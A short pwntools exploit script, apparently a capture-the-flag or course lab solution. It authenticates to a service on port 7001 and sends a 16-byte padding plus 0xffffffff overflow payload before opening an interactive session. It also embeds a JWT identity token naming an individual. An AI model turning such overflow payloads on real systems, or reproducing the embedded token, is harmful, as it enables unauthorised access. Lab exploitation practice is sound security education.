from pwnlib import *

from ctf_helper import *

id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here

io: tube = start(7001)
read_welcome(id_token)
io.sendline(b"1")
io.recvuntil(b"?")
io.sendline(b"A"*16 + p32(0xffffffff))


io.interactive()
